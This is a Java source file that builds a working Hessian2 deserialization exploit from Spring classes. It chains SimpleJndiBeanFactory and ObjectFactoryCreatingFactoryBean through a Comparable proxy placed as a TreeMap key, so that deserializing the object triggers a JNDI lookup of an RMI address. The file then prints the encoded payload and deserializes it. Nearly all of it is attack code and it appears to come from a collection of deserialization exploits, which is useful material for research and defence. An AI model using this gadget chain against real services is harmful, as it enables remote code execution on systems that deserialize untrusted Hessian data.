package Seri.Spring;

import Seri.Utils;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.HessianInput;
import org.springframework.beans.factory.ObjectFactory;
import org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.TreeMap;

public class Hessian2 {
    public static void main(String[] args) throws Exception {

        SimpleJndiBeanFactory beanFactory = new SimpleJndiBeanFactory();
        ObjectFactoryCreatingFactoryBean objectFactoryCreatingFactoryBean = new ObjectFactoryCreatingFactoryBean();
        Field field = Class.forName("org.springframework.beans.factory.config.AbstractFactoryBean")
                .getDeclaredField("beanFactory");
        field.setAccessible(true);
        field.set(objectFactoryCreatingFactoryBean ,beanFactory);
        String rmiPos = "rmi://127.0.0.1:50388/e006ce";
        Utils.setValue(objectFactoryCreatingFactoryBean ,"targetBeanName" ,rmiPos);

        Method method = objectFactoryCreatingFactoryBean.getClass().getDeclaredMethod("createInstance");
        method.setAccessible(true);
        ObjectFactory factory = (ObjectFactory) method.invoke(objectFactoryCreatingFactoryBean);

        Constructor invocationConstructor = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
                .getDeclaredConstructor(ObjectFactory.class);
        invocationConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) invocationConstructor.newInstance(factory);

        Comparable comparable = (Comparable) Proxy.newProxyInstance(
                Comparable.class.getClassLoader(),
                new Class[]{Comparable.class},
                invocationHandler
        );

        TreeMap<Object ,Object> map = new TreeMap<>();
        map.put(1 ,1);

        Field root = map.getClass().getDeclaredField("root");
        root.setAccessible(true);
        Object rootEntry = root.get(map);

        Field keyField = rootEntry.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(rootEntry, comparable);

        String payload = serialize(map);
        System.out.println(payload);
        deserialize(payload);

    }

    public static <T> String serialize(T object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
        hessian2Output.writeObject(object);
        hessian2Output.flushBuffer();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }
    public static <T> T deserialize(String string) throws Exception {
        ByteArrayInputStream byteArrayInputStream = new
                ByteArrayInputStream(Base64.getDecoder().decode(string));
        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
        return (T) hessian2Input.readObject();
    }
}
